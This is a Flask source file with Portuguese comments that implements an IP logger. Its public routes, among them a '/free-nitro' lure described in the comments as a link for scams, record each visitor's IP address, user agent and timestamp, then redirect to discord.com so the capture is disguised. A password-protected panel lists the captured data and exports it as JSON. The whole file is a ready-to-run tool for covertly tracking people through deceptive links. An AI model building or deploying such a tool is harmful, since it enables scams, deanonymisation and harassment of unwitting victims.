from flask import Flask, request, jsonify, render_template_string, redirect
import datetime
import os
from functools import wraps

app = Flask(__name__)

# ================= CONFIGURAÇÃO =================
# Defina uma senha para acessar o painel (mude para algo seguro)
# No Replit, você pode criar uma variável de ambiente SECRET_PASSWORD
SENHA_PAINEL = os.environ.get('SENHA_PAINEL', 'admin123')

# Armazenamento dos IPs capturados (em memória)
# Cada entrada: { 'ip': 'x.x.x.x', 'user_agent': '...', 'timestamp': '...', 'path': '...' }
ips_capturados = []

# ================= FUNÇÃO AUXILIAR =================
def get_real_ip():
    """Obtém o IP real do visitante considerando proxies (Replit, Cloudflare, etc)"""
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

# ================= LINK PÚBLICO (VÍTIMA) =================
@app.route('/')
def home():
    """Página inicial pública (pode ser usada como isca)"""
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Carregando...</title></head>
    <body>
        <h1>Redirecionando...</h1>
        <script>
            // Apenas um redirecionamento inofensivo (pode trocar para qualquer site)
            window.location.href = "https://discord.com";
        </script>
    </body>
    </html>
    '''

@app.route('/log')
def capturar_ip():
    """Endpoint público que captura o IP de quem acessar (pode ser chamado de qualquer forma)"""
    ip = get_real_ip()
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    timestamp = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    
    # Registra a captura
    ips_capturados.append({
        'ip': ip,
        'user_agent': user_agent,
        'timestamp': timestamp,
        'path': request.full_path
    })
    
    # Redireciona para um site legítimo para disfarçar
    return redirect('https://discord.com', code=302)

# Você pode criar quantos links públicos quiser. Exemplo:
@app.route('/click')
def capturar_click():
    """Outro link público alternativo"""
    return capturar_ip()  # mesma lógica

@app.route('/free-nitro')
def capturar_nitro():
    """Link atraente para enviar em golpes (exemplo educacional)"""
    return capturar_ip()

# ================= PAINEL PRIVADO (SÓ VOCÊ) =================
def verificar_senha(f):
    """Decorator que verifica a senha via query string ?senha=..."""
    @wraps(f)
    def decorated(*args, **kwargs):
        senha = request.args.get('senha')
        if senha != SENHA_PAINEL:
            return "Acesso negado. Use ?senha=SUA_SENHA", 401
        return f(*args, **kwargs)
    return decorated

@app.route('/painel')
@verificar_senha
def painel():
    """Seu painel privado – mostra todos os IPs capturados"""
    # Template HTML embutido
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Painel de IPs Capturados</title>
        <meta charset="UTF-8">
        <style>
            body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
            table { border-collapse: collapse; width: 100%; background: #222; }
            th, td { border: 1px solid #444; padding: 8px; text-align: left; }
            th { background: #333; }
            .ip { font-family: monospace; font-weight: bold; color: #0f0; }
            .user-agent { font-size: 0.9em; color: #ccc; }
            .total { margin-bottom: 20px; font-size: 1.2em; }
            button { background: #d32f2f; color: white; border: none; padding: 10px; cursor: pointer; }
            button:hover { background: #b71c1c; }
            a { color: #0f0; }
        </style>
    </head>
    <body>
        <h1>📡 Painel de IPs Capturados</h1>
        <div class="total">Total de capturas: <strong>{{ total }}</strong></div>
        <form method="get" action="/painel" style="margin-bottom: 20px;">
            <input type="hidden" name="senha" value="{{ senha }}">
            <button type="submit" name="acao" value="limpar" onclick="return confirm('Limpar TODOS os IPs capturados?')">🗑️ Limpar tudo</button>
            <button type="submit" name="acao" value="baixar">📥 Baixar JSON</button>
        </form>
        <table>
            <tr>
                <th>#</th>
                <th>IP</th>
                <th>Data/Hora</th>
                <th>User-Agent</th>
                <th>Path</th>
            </tr>
            {% for item in ips %}
            <tr>
                <td>{{ loop.index }}</td>
                <td class="ip">{{ item.ip }}</td>
                <td>{{ item.timestamp }}</td>
                <td class="user-agent">{{ item.user_agent }}</td>
                <td>{{ item.path }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    '''
    
    acao = request.args.get('acao')
    if acao == 'limpar':
        ips_capturados.clear()
        return redirect(f'/painel?senha={SENHA_PAINEL}')
    elif acao == 'baixar':
        import json
        return jsonify(ips_capturados)
    
    return render_template_string(html, ips=ips_capturados[::-1], total=len(ips_capturados), senha=SENHA_PAINEL)

# ================= ROTA DE TESTE (opcional) =================
@app.route('/teste')
def teste():
    """Para você testar a captura (acesse e veja no painel)"""
    return capturar_ip()

# ================= INICIALIZAÇÃO =================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print("="*50)
    print("🚀 SERVIDOR RODANDO")
    print(f"🔗 LINK PÚBLICO para enviar às pessoas: https://{os.environ.get('REPL_SLUG')}.{os.environ.get('REPL_OWNER')}.repl.co/log")
    print(f"🔐 PAINEL PRIVADO: https://{os.environ.get('REPL_SLUG')}.{os.environ.get('REPL_OWNER')}.repl.co/painel?senha={SENHA_PAINEL}")
    print("="*50)
    app.run(host='0.0.0.0', port=port, debug=True)